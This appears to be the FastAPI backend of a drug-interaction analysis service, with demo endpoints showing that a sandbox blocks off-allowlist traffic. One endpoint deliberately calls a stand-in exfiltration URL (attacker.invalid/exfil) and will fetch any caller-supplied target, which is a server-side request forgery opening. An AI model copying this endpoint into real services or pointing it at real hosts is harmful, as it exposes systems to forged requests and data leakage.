"""Acuity FastAPI application.

`/health`            — liveness probe.
`/api/analyze`       — run the LangGraph pipeline on a regimen.
`/api/policy`        — return the NemoClaw policy YAML (BE-15).
`/api/audit-log`     — return recent OpenShell audit-log lines (BE-15).
"""

from __future__ import annotations

import json
import logging
import os
import uuid
from pathlib import Path
from typing import Optional

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field

load_dotenv()
logging.basicConfig(level=os.environ.get("LOG_LEVEL", "INFO"))

from backend.graph import run_analysis, run_analysis_streaming  # noqa: E402
from backend.memory import reset as reset_memory  # noqa: E402
from backend.schemas import RegimenReport  # noqa: E402


app = FastAPI(title="Acuity Drug Interaction API", version="0.1.0")

# Frontend is served separately by Vite during dev; allow it in.
app.add_middleware(
    CORSMiddleware,
    allow_origins=os.environ.get("CORS_ALLOW_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)


# --------------------------------------------------------------------------- #
# Request / response models for the public API
# --------------------------------------------------------------------------- #

class AnalyzeRequest(BaseModel):
    drugs: list[str] = Field(..., min_length=1, max_length=20)
    session_id: Optional[str] = Field(
        None,
        description="Opaque session id; reuse it on follow-up queries to get memory deltas.",
    )


class AnalyzeResponse(BaseModel):
    session_id: str
    report: RegimenReport
    durations_ms: dict[str, int]


# --------------------------------------------------------------------------- #
# Routes
# --------------------------------------------------------------------------- #

@app.get("/health")
async def health() -> dict:
    return {"status": "ok"}


@app.post("/api/analyze", response_model=AnalyzeResponse)
async def analyze(req: AnalyzeRequest) -> AnalyzeResponse:
    session_id = req.session_id or str(uuid.uuid4())
    try:
        state = await run_analysis(session_id, req.drugs)
    except Exception as e:  # noqa: BLE001
        logging.exception("analysis pipeline failed")
        raise HTTPException(status_code=500, detail=f"pipeline failure: {e}")
    return AnalyzeResponse(
        session_id=session_id,
        report=state["report"],
        durations_ms=state["durations_ms"],
    )


async def _sse_generator(session_id: str, drugs: list[str]):
    try:
        async for event_type, payload in run_analysis_streaming(session_id, drugs):
            data_line = json.dumps(payload, default=str)
            yield f"event: {event_type}\ndata: {data_line}\n\n"
    except Exception as e:
        logging.exception("SSE generator crashed")
        err = json.dumps({"detail": str(e), "stage": "unknown"}, default=str)
        yield f"event: error\ndata: {err}\n\n"


@app.post("/api/analyze/stream")
async def analyze_stream(req: AnalyzeRequest) -> StreamingResponse:
    session_id = req.session_id or str(uuid.uuid4())
    return StreamingResponse(
        _sse_generator(session_id, req.drugs),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Nginx-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


@app.delete("/api/session/{session_id}")
async def reset_session(session_id: str) -> dict:
    reset_memory(session_id)
    return {"status": "reset", "session_id": session_id}


# --------------------------------------------------------------------------- #
# NemoClaw demo surfaces (BE-15)
# --------------------------------------------------------------------------- #

_POLICY_PATH = Path(__file__).resolve().parent.parent / "policies" / "policy.yaml"
_AUDIT_LOG_PATH = Path(os.environ.get("NEMOCLAW_AUDIT_LOG", "/session/audit.log"))
_AUDIT_LOG_SAMPLE = (
    Path(__file__).resolve().parent.parent / "samples" / "nemoclaw_audit_full_run.log"
)


@app.get("/api/policy")
async def get_policy() -> dict:
    if not _POLICY_PATH.exists():
        raise HTTPException(status_code=404, detail="policy file not found")
    return {
        "path": str(_POLICY_PATH),
        "yaml": _POLICY_PATH.read_text(),
        "allowlist": [
            "api.fda.gov",
            "rxnav.nlm.nih.gov",
            "pubchem.ncbi.nlm.nih.gov",
            "integrate.api.nvidia.com",
        ],
    }


def _read_log_lines(path: Path, limit: int) -> list[str]:
    with path.open() as f:
        return [line.rstrip("\n") for line in f.readlines()[-limit:]]


@app.get("/api/audit-log")
async def get_audit_log(limit: int = 200) -> dict:
    """Return the OpenShell audit log.

    Prefers the live audit log file when running inside the NemoClaw sandbox.
    Falls back to the saved sample (from BE-14) so the frontend has something
    to render in dev or off-sandbox demos.
    """
    if _AUDIT_LOG_PATH.exists():
        try:
            return {
                "path": str(_AUDIT_LOG_PATH),
                "source": "live",
                "lines": _read_log_lines(_AUDIT_LOG_PATH, limit),
            }
        except OSError as e:
            raise HTTPException(status_code=500, detail=f"audit-log read error: {e}")

    if _AUDIT_LOG_SAMPLE.exists():
        return {
            "path": str(_AUDIT_LOG_SAMPLE),
            "source": "sample",
            "lines": _read_log_lines(_AUDIT_LOG_SAMPLE, limit),
        }

    return {"path": str(_AUDIT_LOG_PATH), "source": "none", "lines": []}


class AttackResponse(BaseModel):
    target: str
    attempted: bool
    blocked: bool
    detail: str
    audit_excerpt: list[str]


@app.post("/api/attack-case", response_model=AttackResponse)
async def trigger_attack_case(target: str = "https://attacker.invalid/exfil") -> AttackResponse:
    """Demo-only endpoint: deliberately attempt an off-whitelist outbound call.

    Inside the NemoClaw sandbox the connection is dropped by OpenShell and an
    audit-log entry is generated. Outside the sandbox (host dev) the request
    leaves the machine and we return the network error from the client, so
    the frontend can still render a useful "what would happen" panel.
    """
    import httpx as _httpx

    attempted = True
    blocked = False
    detail = ""
    try:
        async with _httpx.AsyncClient(timeout=4.0) as c:
            r = await c.get(target)
        detail = f"request unexpectedly succeeded: HTTP {r.status_code}"
    except _httpx.ConnectError as e:
        # 403 CONNECT failure from OpenShell looks like a connect error to httpx.
        msg = str(e)
        blocked = "403" in msg or "tunnel" in msg.lower() or "policy" in msg.lower()
        detail = msg or "connection refused"
    except _httpx.HTTPError as e:
        detail = f"http error: {e}"
    except OSError as e:
        # DNS failure for `.invalid` host on plain hosts → also a useful demo.
        detail = f"dns/os error: {e}"
        blocked = "Name or service not known" in detail or "Temporary failure" in detail

    # Grab the most recent audit lines mentioning the host.
    excerpt: list[str] = []
    host = target.split("//", 1)[-1].split("/", 1)[0]
    if _AUDIT_LOG_SAMPLE.exists():
        for line in _read_log_lines(_AUDIT_LOG_SAMPLE, 200):
            if host in line or "DENIED" in line:
                excerpt.append(line)

    return AttackResponse(
        target=target,
        attempted=attempted,
        blocked=blocked,
        detail=detail,
        audit_excerpt=excerpt[-6:],
    )
